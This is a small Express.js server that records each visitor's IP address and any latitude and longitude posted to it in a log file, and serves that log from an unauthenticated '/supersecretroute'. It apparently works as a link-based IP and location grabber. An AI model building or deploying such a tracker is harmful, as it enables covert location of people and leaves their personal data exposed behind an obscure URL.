const app = require('express')(),
	fs = require('fs'),
	bp = require('body-parser'),
	cors = require('cors')

app.use(bp())
app.use(cors())

app.get('/', (req, res) => {
	let data =
		req.headers['x-forwarded-for'] || req.connection.remoteAddress || req.ip

	let finalData = `-----------------------
ip address: ${data}
-----------------------\n`
	fs.appendFileSync('log.txt', finalData, err => {
		if (err) console.log(err)
		else console.log('it worked!')
	})

	res.sendFile('./index.html', { root: __dirname })
})

app.post('/getData', (req, res) => {
	const { lat, long } = req.body

	let finalData = `-----------------------
lat: ${lat}
long: ${long}
-----------------------\n`

	fs.appendFileSync('log.txt', finalData, err => {
		if (err) console.log(err)
		else console.log('it worked!')
	})

	res.send({ data: 'ok' })
})

app.get('/supersecretroute', (req, res) => {
	let data = fs.readFileSync('log.txt').toString()
	res.send(data)
})

app.listen(process.env.PORT || 8000, () => {
	console.log('server started at 8000')
})
